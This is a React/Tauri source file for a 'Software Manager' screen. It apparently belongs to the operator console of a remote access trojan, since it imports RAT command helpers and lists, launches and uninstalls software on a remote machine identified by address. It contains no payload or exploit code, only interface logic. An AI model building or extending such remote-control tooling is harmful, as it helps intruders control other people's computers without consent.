import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import { invoke } from "@tauri-apps/api/core";
import {
  requestSoftwareInventoryCmd,
} from "../rat/RATCommands";
import {
  SoftwareInventoryPayload,
  SoftwareEntry,
  SoftwareIconResultPayload,
  SoftwareActionResultPayload,
} from "../../types";
import {
  IconApps,
  IconPlayerPlay,
  IconTrash,
  IconSearch,
  IconRefresh,
  IconExternalLink,
} from "@tabler/icons-react";

export const Software: React.FC = () => {
  const { addr } = useParams();
  const [softwareApps, setSoftwareApps] = useState<SoftwareEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState("Ready");
  const [searchTerm, setSearchTerm] = useState("");
  const [actionLoading, setActionLoading] = useState<string | null>(null);

  useEffect(() => {
    let unlistenSoftware: (() => void) | null = null;
    let unlistenIcon: (() => void) | null = null;
    let unlistenAction: (() => void) | null = null;

    const setupListeners = async () => {
      unlistenSoftware = await listen("software_inventory", (event) => {
        const payload = event.payload as SoftwareInventoryPayload;
        if (payload.addr !== addr) return;
        setSoftwareApps(payload.data.applications);
        setStatus("Software inventory recovered");
        setLoading(false);
      });

      unlistenIcon = await listen("software_icon_result", (event) => {
        const payload = event.payload as SoftwareIconResultPayload;
        if (payload.addr !== addr) return;
        setSoftwareApps((prev) =>
          prev.map((app) =>
            app.name === payload.data.name
              ? { ...app, icon_base64: payload.data.icon_base64 }
              : app
          )
        );
      });

      unlistenAction = await listen("software_action_result", (event) => {
        const payload = event.payload as SoftwareActionResultPayload;
        if (payload.addr !== addr) return;
        setActionLoading(null);
        setStatus(payload.data.message);
      });
    };

    setupListeners();

    return () => {
      unlistenSoftware?.();
      unlistenIcon?.();
      unlistenAction?.();
    };
  }, [addr]);

  const requestInventory = async () => {
    if (!addr) return;
    setStatus("Requesting software inventory...");
    setLoading(true);
    try {
      await requestSoftwareInventoryCmd(addr);
    } catch (e) {
      console.error(e);
      setStatus("Request failed");
      setLoading(false);
    }
  };

  const launchSoftware = async (name: string) => {
    if (!addr) return;
    setActionLoading(name);
    setStatus(`Launching ${name}...`);
    try {
      await invoke("launch_software", { addr, name });
    } catch (e) {
      console.error(e);
      setActionLoading(null);
      setStatus("Launch failed");
    }
  };

  const uninstallSoftware = async (name: string) => {
    if (!addr) return;
    setActionLoading(name);
    setStatus(`Starting uninstaller for ${name}...`);
    try {
      await invoke("uninstall_software", { addr, name });
    } catch (e) {
      console.error(e);
      setActionLoading(null);
      setStatus("Uninstall failed");
    }
  };

  const fetchIcon = async (name: string) => {
    if (!addr) return;
    try {
      await invoke("get_software_icon", { addr, name });
    } catch (e) {
      console.error(e);
    }
  };

  const filteredApps = softwareApps.filter((app) =>
    app.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
    app.publisher.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="flex flex-col h-screen bg-[#050505] text-gray-200 overflow-hidden font-sans">
      <div className="h-16 shrink-0 bg-[#0a0a0a] border-b border-[#1a1a1a] flex items-center justify-between px-6 shadow-xl z-20">
        <div className="flex items-center gap-4">
          <div className="p-2 bg-accentx/10 rounded-xl border border-accentx/20">
            <IconApps className="text-accentx" size={24} />
          </div>
          <div>
            <h1 className="text-lg font-black tracking-tighter uppercase italic text-white">
              Software Manager
            </h1>
            <p className="text-[10px] font-mono text-gray-500 uppercase tracking-widest leading-none">
              Manage installed applications
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <span className="text-xs uppercase tracking-[0.3em] text-gray-500">
            {status}
          </span>
          <button
            onClick={requestInventory}
            className="rounded-xl bg-[#111] px-4 py-2 text-xs text-white hover:bg-[#222] transition flex items-center gap-2"
            disabled={loading}
          >
            <IconRefresh size={14} /> Refresh
          </button>
        </div>
      </div>

      <div className="flex flex-1 overflow-hidden">
        <div className="w-64 shrink-0 bg-[#080808] border-r border-[#1a1a1a] p-4 space-y-4">
          <div className="relative">
            <IconSearch
              size={16}
              className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500"
            />
            <input
              type="text"
              placeholder="Search software..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="w-full rounded-xl bg-[#111] border border-[#1a1a1a] pl-10 pr-4 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-accentx/50"
            />
          </div>

          <div className="rounded-2xl bg-[#0f0f0f] border border-[#1a1a1a] p-4">
            <div className="flex items-center justify-between text-xs uppercase tracking-[0.3em] text-gray-500 mb-3">
              <span>Stats</span>
            </div>
            <div className="space-y-2 text-[11px] text-gray-300">
              <div>Total: {softwareApps.length}</div>
              <div>Showing: {filteredApps.length}</div>
              <div>Status: {loading ? "Loading..." : "Idle"}</div>
            </div>
          </div>
        </div>

        <div className="flex-1 p-6 overflow-y-auto bg-[#050505]">
          <div className="grid grid-cols-1 gap-3">
            {filteredApps.length === 0 ? (
              <p className="text-sm text-gray-500">
                {softwareApps.length === 0
                  ? "No software inventory available. Click Refresh to scan."
                  : "No software matches your search."}
              </p>
            ) : (
              filteredApps.map((app, index) => (
                <div
                  key={index}
                  className="rounded-2xl border border-[#1a1a1a] p-4 bg-[#111] hover:border-[#2a2a2a] transition"
                >
                  <div className="flex items-start gap-4">
                    {app.icon_base64 ? (
                      <img
                        src={`data:image/png;base64,${app.icon_base64}`}
                        alt={app.name}
                        className="w-10 h-10 rounded-lg bg-[#1a1a1a] object-contain shrink-0"
                      />
                    ) : (
                      <button
                        onClick={() => fetchIcon(app.name)}
                        className="w-10 h-10 rounded-lg bg-[#1a1a1a] flex items-center justify-center text-gray-500 hover:text-white shrink-0 transition"
                        title="Load icon"
                      >
                        <IconExternalLink size={16} />
                      </button>
                    )}

                    <div className="flex-1 min-w-0">
                      <div className="text-sm font-semibold text-white truncate">
                        {app.name}
                      </div>
                      <div className="text-xs text-gray-400 mt-1">
                        Version: {app.version || "n/a"}
                      </div>
                      <div className="text-xs text-gray-400">
                        Publisher: {app.publisher || "n/a"}
                      </div>
                      {app.install_location && (
                        <div className="text-xs text-gray-500 mt-1 truncate">
                          Location: {app.install_location}
                        </div>
                      )}
                    </div>

                    <div className="flex items-center gap-2 shrink-0">
                      <button
                        onClick={() => launchSoftware(app.name)}
                        disabled={actionLoading === app.name}
                        className="rounded-xl bg-green-700/20 text-green-400 px-3 py-2 text-xs font-bold uppercase tracking-tight hover:bg-green-700/30 transition flex items-center gap-1 disabled:opacity-50"
                      >
                        <IconPlayerPlay size={14} /> Launch
                      </button>
                      {app.uninstall_command && (
                        <button
                          onClick={() => uninstallSoftware(app.name)}
                          disabled={actionLoading === app.name}
                          className="rounded-xl bg-red-700/20 text-red-400 px-3 py-2 text-xs font-bold uppercase tracking-tight hover:bg-red-700/30 transition flex items-center gap-1 disabled:opacity-50"
                        >
                          <IconTrash size={14} /> Uninstall
                        </button>
                      )}
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
